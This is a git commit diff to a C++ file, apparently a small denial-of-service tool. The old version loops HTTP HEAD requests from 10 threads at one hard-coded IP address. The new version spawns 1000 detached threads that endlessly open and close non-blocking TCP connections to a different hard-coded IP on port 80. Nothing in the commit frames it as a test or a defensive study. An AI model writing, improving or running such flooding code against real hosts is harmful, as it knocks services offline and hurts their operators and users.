dfb2448ce45724a14448caf970e03d124c668ba6
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-18 18:08:59 +0600

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,70 +1,42 @@
-#include <boost/beast/core.hpp>
-#include <boost/beast/http.hpp>
-#include <boost/asio/connect.hpp>
-#include <boost/asio/ip/tcp.hpp>
-#include <cstdlib>
 #include <iostream>
-#include <string>
-#include <pthread.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <thread>
+#include <fcntl.h> // for non-blocking mode
 
-namespace http = boost::beast::http;    // from <boost/beast/http.hpp>
-namespace net = boost::asio;            // from <boost/asio.hpp>
-using tcp = boost::asio::ip::tcp;       // from <boost/asio/ip/tcp.hpp>
+const int num_threads = 1000;
 
-#define NUM_THREADS 10
+void connectAndClose() {
+    const char* server_ip = "193.228.196.49";
+    const int server_port = 80;
 
-void *send_request(void *threadid) {
-    auto const host = "88.198.48.45";
-    auto const port = "80";
-    auto const target = "/";
-    int version = 11;
+    while (true) {
+        int clientSocket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+        if (clientSocket == -1) {
+            std::cerr << "Error creating socket." << std::endl;
+            return;
+        }
 
-    net::io_context ioc;
+        struct sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(server_port);
+        serverAddr.sin_addr.s_addr = inet_addr(server_ip);
 
-    tcp::resolver resolver(ioc);
-    auto const results = resolver.resolve(host, port);
-
-    tcp::socket socket(ioc);
-    net::connect(socket, results.begin(), results.end());
-
-    http::request<http::empty_body> req{http::verb::head, target, version};
-    req.set(http::field::host, host);
-    req.set(http::field::user_agent, "My Program v1.0");  // User-Agent header added here
-
-    while(true) {
-        http::write(socket, req);
-
-        boost::beast::flat_buffer buffer;
-
-        http::response<http::dynamic_body> res;
-        http::read(socket, buffer, res);
-
-        std::cout << res << std::endl;
+        connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
+        
+        close(clientSocket);
     }
-
-    socket.shutdown(tcp::socket::shutdown_both);
-
-    pthread_exit(NULL);
 }
 
-int main(void)
-{
-  pthread_t threads[NUM_THREADS];
-  int rc;
-  long t;
+int main() {
+    for (int i = 0; i < num_threads; ++i) {
+        std::thread connectionThread(connectAndClose);
+        connectionThread.detach();
+    }
 
-  for(t=0; t<NUM_THREADS; t++){
-     rc = pthread_create(&threads[t], NULL, send_request, (void *)t);
-     if (rc){
-       printf("ERROR; return code from pthread_create() is %d\n", rc);
-       exit(-1);
-     }
-  }
+    // Keep the main thread running indefinitely
+    while (true) {}
 
-  /* Wait for all threads to complete */
-  for(t=0; t<NUM_THREADS; t++){
-     pthread_join(threads[t], NULL);
-  }
-
-  return EXIT_SUCCESS;
+    return 0;
 }
